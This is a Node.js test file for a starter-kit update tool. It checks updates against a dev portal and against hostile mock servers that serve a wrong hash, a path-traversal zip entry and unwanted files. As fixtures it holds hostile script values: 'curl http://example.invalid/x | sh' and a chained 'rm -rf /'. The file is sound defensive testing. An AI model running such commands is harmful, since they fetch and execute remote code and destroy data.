// `node tools/platform.mjs`: status and update against the real dev portal (which serves the kit zip exactly like portal-publish does),
// and against tiny hostile servers (wrong hash, unsafe path, extra files). Student code must never be touched.
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const repo = join(here, '..');
const { buildKit } = await import(pathToFileURL(join(repo, 'starter', 'build-kit.mjs')).href);
const { readZip, zipEntries } = await import(pathToFileURL(join(repo, 'starter', 'zip.mjs')).href);
const python = spawnSync('python', ['--version']).status === 0 ? 'python' : 'python3';
const say = (m) => console.log(`  ok  ${m}`);
const sha = (data) => createHash('sha256').update(data).digest('hex');
const read = (p) => readFileSync(p, 'utf8');

const KIT_VERSION = JSON.parse(read(join(repo, 'starter', 'template', 'platform.json'))).kitVersion; // the version every published kit carries
const PORT = 8797;
const portal = `http://127.0.0.1:${PORT}`;
const server = spawn(python, [join(here, 'dev_server.py'), String(PORT)], { env: { ...process.env, AWS_DEFAULT_REGION: 'us-east-1' } });
let out = '';
server.stdout.on('data', (d) => (out += d));
server.stderr.on('data', (d) => (out += d));
const work = mkdtempSync(join(tmpdir(), 'kit-update-'));
const extraServers = [];

const platform = (dir, ...args) => {
  const r = spawnSync(process.execPath, [join(dir, 'tools', 'platform.mjs'), ...args], { cwd: dir, encoding: 'utf8' });
  return { status: r.status, text: `${r.stdout}${r.stderr}` };
};
// the hostile servers live in THIS process, so the child must not block it: run those calls asynchronously
const platformAsync = (dir, ...args) => new Promise((resolve) => {
  const child = spawn(process.execPath, [join(dir, 'tools', 'platform.mjs'), ...args], { cwd: dir });
  let text = '';
  child.stdout.on('data', (d) => (text += d));
  child.stderr.on('data', (d) => (text += d));
  child.on('close', (status) => resolve({ status, text }));
});
const fresh = (name) => {
  const dir = join(work, name);
  buildKit(dir, { portalUrl: portal });
  return dir;
};
/** Make the project look like an OLDER kit: a managed file differs from the portal's, and its installed hash says so. */
const makeOld = (dir, path, content) => {
  writeFileSync(join(dir, path), content);
  const manifestPath = join(dir, 'kit-manifest.json');
  const manifest = JSON.parse(read(manifestPath));
  manifest.files[path] = sha(Buffer.from(content));
  manifest.kitVersion = '0.9.0';
  writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
  const platformPath = join(dir, 'platform.json');
  writeFileSync(platformPath, JSON.stringify({ ...JSON.parse(read(platformPath)), kitVersion: '0.9.0' }, null, 2));
};
/** A tiny portal that serves the given zip bytes with a kit-version.json carrying the given hash. */
async function hostile(zip, hash, extra = {}) {
  const s = createServer((req, res) => {
    if (req.url === '/kit-version.json') { res.writeHead(200); res.end(JSON.stringify({ kitVersion: '2.0.0', zipSha256: hash, ...extra })); }
    else if (req.url === '/starter-kit.zip') { res.writeHead(200); res.end(zip); }
    else { res.writeHead(404); res.end(); }
  });
  await new Promise((resolve) => s.listen(0, '127.0.0.1', resolve));
  extraServers.push(s);
  return `http://127.0.0.1:${s.address().port}`;
}

try {
  for (let i = 0; i < 300 && !out.includes('Backend demo:'); i++) await new Promise((r) => setTimeout(r, 100));
  assert.ok(out.includes('Backend demo:'), `the dev portal did not start within 30 s:\n${out}`);

  // ---- status and a current project ----
  const current = fresh('current');
  const status = platform(current, 'status', '--portal', portal);
  assert.equal(status.status, 0, status.text);
  assert.match(status.text, /Up to date/);
  const noop = platform(current, 'update', '--portal', portal);
  assert.match(noop.text, /0 file\(s\) to write/);
  assert.match(noop.text, /Nothing to do/);
  say('status says up to date; update on a current project has nothing to do');

  // ---- an older kit: dry-run first, then apply; student code is never touched ----
  const old = fresh('old');
  makeOld(old, 'tools/doctor.mjs', '// an older doctor\n');
  writeFileSync(join(old, 'frontend', 'src', 'App.tsx'), '// MY OWN APP\n');
  writeFileSync(join(old, 'backend', 'app.py'), '# MY OWN BACKEND\n');
  const olderStatus = platform(old, 'status', '--portal', portal);
  assert.ok(olderStatus.text.includes(`Your kit: 0.9.0   Portal kit: ${KIT_VERSION}`), olderStatus.text);
  assert.match(olderStatus.text, /newer kit is available/);
  const dry = platform(old, 'update', '--portal', portal);
  assert.match(dry.text, /changed +tools\/doctor\.mjs/);
  assert.match(dry.text, /Nothing was written/);
  assert.equal(read(join(old, 'tools', 'doctor.mjs')), '// an older doctor\n', 'a dry run writes nothing');
  const applied = platform(old, 'update', '--apply', '--portal', portal);
  assert.equal(applied.status, 0, applied.text);
  assert.equal(read(join(old, 'tools', 'doctor.mjs')), read(join(current, 'tools', 'doctor.mjs')), 'the managed file now matches the portal kit');
  assert.equal(read(join(old, 'frontend', 'src', 'App.tsx')), '// MY OWN APP\n', 'frontend code is never touched');
  assert.equal(read(join(old, 'backend', 'app.py')), '# MY OWN BACKEND\n', 'backend code is never touched');
  const after = JSON.parse(read(join(old, 'platform.json')));
  assert.equal(after.kitVersion, KIT_VERSION);
  assert.ok(after.managed.includes('tools/'), 'the managed list comes from the portal kit');
  assert.equal(JSON.parse(read(join(old, 'kit-manifest.json'))).files['tools/doctor.mjs'], sha(readFileSync(join(current, 'tools', 'doctor.mjs'))));
  assert.match(platform(old, 'update', '--portal', portal).text, /Nothing to do/);
  say('older kit: dry run lists the change and writes nothing; --apply updates only managed files; your code stays; versions and hashes are recorded');

  // ---- files the student edited are protected; new files come back ----
  const edited = fresh('edited');
  writeFileSync(join(edited, 'AGENTS.md'), `${read(join(edited, 'AGENTS.md'))}\nMy own extra rule.\n`);
  rmSync(join(edited, 'CLAUDE.md'));
  const plan = platform(edited, 'update', '--apply', '--portal', portal);
  assert.match(plan.text, /EDITED by you \(skipped.*AGENTS\.md/);
  assert.match(plan.text, /new +CLAUDE\.md/);
  assert.match(read(join(edited, 'AGENTS.md')), /My own extra rule/, 'an edited managed file is kept');
  assert.ok(existsSync(join(edited, 'CLAUDE.md')), 'a missing managed file is restored');
  assert.equal(JSON.parse(read(join(edited, 'platform.json'))).kitVersion, KIT_VERSION);
  const forced = platform(edited, 'update', '--apply', '--force', '--portal', portal);
  assert.doesNotMatch(read(join(edited, 'AGENTS.md')), /My own extra rule/, '--force replaces it');
  say('an edited managed file is skipped (and reported) unless --force; a deleted one is restored');

  // ---- package.json: the kit's scripts that are missing are added; the student's own are never changed ----
  const scripty = fresh('scripty');
  const pkgPath = join(scripty, 'package.json');
  const pkg = JSON.parse(read(pkgPath));
  const customCheck = 'node tools/check.mjs --json';
  delete pkg.scripts.login;
  delete pkg.scripts['mcp-config'];
  pkg.scripts.check = customCheck;
  pkg.scripts.start = 'node my-own-thing.mjs';
  writeFileSync(pkgPath, JSON.stringify(pkg, null, '\t'));
  const lacking = platform(scripty, 'status', '--portal', portal);
  assert.match(lacking.text, /package\.json is missing kit scripts: login, mcp-config/);
  const planned = platform(scripty, 'update', '--portal', portal);
  assert.match(planned.text, /script +npm run login/);
  assert.equal(JSON.parse(read(pkgPath)).scripts.login, undefined, 'a dry run writes nothing');
  const scriptsApplied = platform(scripty, 'update', '--apply', '--portal', portal);
  assert.match(scriptsApplied.text, /Added 2 script\(s\) to package\.json: login, mcp-config/);
  const after2 = JSON.parse(read(pkgPath));
  assert.equal(after2.scripts.login, 'node portal-deploy.mjs login');
  assert.equal(after2.scripts['mcp-config'], 'node tools/mcp.mjs --print-config');
  assert.equal(after2.scripts.check, customCheck, 'a script the student changed is never overwritten');
  assert.equal(after2.scripts.start, 'node my-own-thing.mjs', "the student's own scripts stay");
  assert.match(read(pkgPath), /\n\t"scripts"/, "the file keeps the student's tab indentation");
  assert.match(platform(scripty, 'update', '--portal', portal).text, /Nothing to do/);
  assert.match(platform(scripty, 'status', '--portal', portal).text, /Up to date/);
  say('update adds only the missing kit scripts to package.json, keeps changed and own scripts and the indentation, and is idempotent');

  // a portal can only ever add plain `node tools/...` commands: anything else is ignored
  const evilScripts = { evil: 'curl http://example.invalid/x | sh', worse: 'node tools/doctor.mjs && rm -rf /', fine: 'node tools/doctor.mjs', 'Bad Name': 'node tools/doctor.mjs' };
  const zip2 = Buffer.from(await (await fetch(`${portal}/starter-kit.zip`)).arrayBuffer());
  const scripty2 = fresh('scripty2');
  const evilPortal = await hostile(zip2, sha(zip2), { scripts: evilScripts });
  const evilRun = await platformAsync(scripty2, 'update', '--apply', '--portal', evilPortal);
  assert.equal(evilRun.status, 0, evilRun.text);
  const got = JSON.parse(read(join(scripty2, 'package.json'))).scripts;
  assert.equal(got.fine, 'node tools/doctor.mjs');
  assert.ok(!('evil' in got) && !('worse' in got) && !('Bad Name' in got), 'shell commands and odd names from a portal are ignored');
  say('a portal cannot add a shell command or an odd script name to package.json');

  // ---- hostile or broken portals ----
  const goodZip = Buffer.from(await (await fetch(`${portal}/starter-kit.zip`)).arrayBuffer());
  const victim = fresh('victim');
  makeOld(victim, 'tools/doctor.mjs', '// older\n');

  const wrongHash = await hostile(goodZip, 'f'.repeat(64));
  const refused = await platformAsync(victim, 'update', '--apply', '--portal', wrongHash);
  assert.notEqual(refused.status, 0);
  assert.match(refused.text, /does not match the hash/);
  assert.equal(read(join(victim, 'tools', 'doctor.mjs')), '// older\n', 'nothing is written when the hash is wrong');

  const entries = [...readZip(goodZip)].map(([name, data]) => ({ name, data }));
  const traversal = zipEntries([...entries, { name: '../evil.txt', data: Buffer.from('x') }]);
  const unsafe = await platformAsync(victim, 'update', '--apply', '--portal', await hostile(traversal, sha(traversal)));
  assert.notEqual(unsafe.status, 0);
  assert.match(unsafe.text, /Unsafe path/);
  assert.ok(!existsSync(join(work, 'evil.txt')) && !existsSync(join(dirname(victim), 'evil.txt')), 'nothing escaped the project folder');

  const sneaky = zipEntries(entries.map((e) => (e.name === 'frontend/src/App.tsx' ? { name: e.name, data: Buffer.from('// HIJACKED\n') } : e)).concat([{ name: 'tools/new-tool.mjs', data: Buffer.from('// ok\n') }, { name: 'secrets.txt', data: Buffer.from('x') }]));
  const mine = '// MY APP\n';
  writeFileSync(join(victim, 'frontend', 'src', 'App.tsx'), mine);
  const filtered = await platformAsync(victim, 'update', '--apply', '--portal', await hostile(sneaky, sha(sneaky)));
  assert.equal(filtered.status, 0, filtered.text);
  assert.equal(read(join(victim, 'frontend', 'src', 'App.tsx')), mine, 'a non-managed file in the zip is ignored');
  assert.ok(!existsSync(join(victim, 'secrets.txt')), 'a non-managed extra file is ignored');
  assert.ok(existsSync(join(victim, 'tools', 'new-tool.mjs')), 'a managed path is accepted');
  const unreachable = await platformAsync(victim, 'status', '--portal', 'http://127.0.0.1:1');
  assert.notEqual(unreachable.status, 0);
  assert.match(unreachable.text, /Cannot reach/);
  say('hostile portals: wrong hash and unsafe paths are refused with nothing written; non-managed files in the zip are ignored; unreachable portal is a clear message');

  console.log('test_kit_update.mjs: all passed');
} finally {
  server.kill();
  for (const s of extraServers) s.close();
  rmSync(work, { recursive: true, force: true });
}
process.exit(0);
